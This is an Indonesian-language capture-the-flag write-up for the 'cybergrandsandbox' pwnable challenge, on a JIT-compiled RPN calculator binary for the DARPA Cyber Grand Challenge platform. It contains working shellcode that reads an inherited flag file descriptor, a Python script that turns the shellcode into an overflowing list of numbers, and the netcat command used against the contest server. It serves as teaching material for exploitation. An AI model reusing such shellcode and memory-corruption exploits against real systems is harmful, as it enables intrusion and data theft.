# cybergrandsandbox

**Kategori:** Pwnable
**Points:** 2
**Deskripsi**

> [You'll need these](http://repo.cybergrandchallenge.com/boxes/)
>
> https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/running-the-vm.md
>
> [Pwn This](http://downloads.notmalware.ru/cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713)
> 
> [This launches it](http://downloads.notmalware.ru/cybergrandsandbox_launcher_cf878d2811220c8793ae9b132d7fd490)
> 
> cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713.quals.shallweplayaga.me:4347

## Write-up

Sesuai instruksi, kita diberikan sebuah binary untuk DARPA [Cyber Grand Challenge](www.darpa.mil/cybergrandchallenge/), yang tampaknya bukan executable biasa. Setelah membaca instruksinya, ternyata kita perlu menjalankan binary ini di virtual machine. Pengguna IDA Pro bisa menggunakan loader <http://idabook.com/cgc/> untuk bisa meload filenya.

Teknologi yang dipakai untuk mensetup virtual machine adalah Vagrant. Tadinya malas mencoba challenge ini, karena lambat sekali ketika mendownload file box dengan Vagrant (single connectiond ownload). Karena sudah pernah memakai Vagrant sebelumnya, saya ingat bahwa file .box bisa didownload dengan download manager dan ditambahkan secara manual dengan `vagrant box add`.  Setelah VM berjalan, saya bisa mencoba binary ini, yang cuma keluar teks `>`


     vagrant@cgc-linux-packer:~$ ./cybergrandsandbox-bin 
     > 

Setelah dipelajari source codenya, ternyata ini evaluator RPN, untuk menghitung 2 + 3, kita masukkan

     > 2 3 +
     5 (0x00000005)

Perhatikan bahwa dengan `strace` bisa dilihat bahwa binary ini tidak memakai syscall standar:

	vagrant@cgc-linux-packer:~$ strace ./cybergrandsandbox-bin 
	execve("./cybergrandsandbox-bin", ["./cybergrandsandbox-bin"], [/* 22 vars */]) = 0
	allocate(0x10008, 0, [0xb7fef000])      = 0
	allocate(0x1394, 1, [0xb7fed000])       = 0
	transmit(1, "> ", 2, > [2])               = 0
	receive(0, 1 2 +
	"1", 1, [1])                 = 0
	receive(0, " ", 1, [1])                 = 0
	receive(0, "2", 1, [1])                 = 0
	receive(0, " ", 1, [1])                 = 0
	receive(0, "+", 1, [1])                 = 0
	receive(0, "\n", 1, [1])                = 0
	transmit(1, "3", 1, 3[1])                = 0
	transmit(1, " (0x", 4,  (0x[4])             = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "0", 1, 0[1])                = 0
	transmit(1, "3", 1, 3[1])                = 0
	transmit(1, ")\n", 2, )
	[2])              = 0
	transmit(1, "> ", 2, > [2])               = 0

Yang menarik adalah: eksekusi dilakukan dengan JIT. Tepatnya setiap token akan menghasilkan kode mesin, sesuai dengan instruksinya. Untuk token angka, angka tersebut diletakkan di alamat memori bawah, jadi kira-kira begini (alamat hanya ilustrasi saja):


Memori | Isi
-------|-------
00001  | var8 = 1
00002  | var9 = 2
...    | ...
00040  | ret
...    | ...
00098  | var9
00099  | var8


Intinya adalah: Jika kita menginput bilangan terlalu banyak, maka ketika dijalankan, kode mesin yang dihasilkan akan menimpa sampai bagian yang berisi nilai variabel. Karena kita bisa mengendalikan nilai variabel, kita bisa membuat shellcode yang akan dijalankan.

Kita harus menulis sendiri shell code untuk CGC ini karena syscall yang dipakai berbeda dengan binary linux biasa. Setelah membaca `man`  mengenai `transmit` dan `receive`, saya bisa mengetahui syscall number untuk keduanya 

     The transmit function is invoked through system call number 2.
     The receive function is invoked through system call number 3.
     
Perhatikan di awal bahwa ada binary yang melaunch program utama, isinya adalah skrip Python:

```python
#!/usr/bin/env python

import os

flag = open("/home/cybergrandsandbox/flag")
os.execv("/home/cybergrandsandbox/cybergrandsandbox-bin", ["/home/cybergrandsandbox/cybergrandsandbox-bin"])
```

Karena skrip tersebut menggunakan `os.execv` (dan bukan `os.system`), maka file handle untuk `flag` masih terbuka, sesuai dengan spesifikasi: penomoran file handle terurut, dan setelah 0 (stdin), 1 (stdout), dan 2 (stderr), maka flag pasti memakai file handle 3. Dari fakta tersebut, saya membuat shell code ini:


    bits 32
    nop
    nop
    nop
    nop
    sub ecx, 100 
    mov eax, 3
    mov ebx, 3
    mov edx, 90
    mov esi,0
    int 0x80
    mov ebx, 1
    mov eax, 2
    int 0x80
    x:
    jmp x

	
Saya memakai beberapa `nop` di depan supaya yakin alignment instruksi berikutnya aman. Untuk buffer membaca file, saya menggunakan `ecx-100` (alamat ini adalah alamat kode yang sudah dieksekusi, jadi aman), berikutnya saya menggunakan syscall `receive` yang nomornya adalah 3 (`eax = 3`) dengan file handle 3 (`ebx = 3`), dan saya baca 90 byte (`edx = 90`), dan saya tidak ingin tahu berapa byte yang terbaca (`esi = 0`). Berikutnya stelah flag terbaca, saya tuliskan di stdout.

Karena syscal mempertahankan (*preserve*) semua register (kecuali `eax` yang merupakan nilai akhir), maka berikutnya saya cuma perlu menset `eax = 2` (syscall untuk transmit), dan menset file handle stdout yang nilainya adalah 1 (`ebx = 1`), sisanya masih sama dengan sebelumnya (menuliskan 90 byte dari `ecx-100`). Setelah itu saya stop programnya dengan jump ke alamat saat ini (`x: jmp x`). 

Saya agak kurang memperhatikan bahwa angka yang dimasukkan boleh berupa hex, jadi exploit saya ini memakai integer:

```python
a = "\t".join([str(x) for x in range(0, 281)]) + "\t"
    
#a += "-1869574000\t" * 9 
b = [2425393296, 3093621123, 3, 955, 5945856, 12451840, 3439329280, 113536,45613056, 3439329280, 16706432]
a += "\t".join([str(x) for x in reversed(b)])
a += "\t0\t0"
#a += "\t[" * 10 #nop
print a
```

Saya tidak membuat kode khusus untuk konek ke server, untuk menjalankannya:

	$ (python ./exp.py; cat) | nc cybergrandsandbox_e722a7ec2ad46b9fb8472db37cb95713.quals.shallweplayaga.me 4347
	> The flag is: g3t 0u+ 0f my 54ndb0x...

Flagnya:

     g3t 0u+ 0f my 54ndb0x...
	
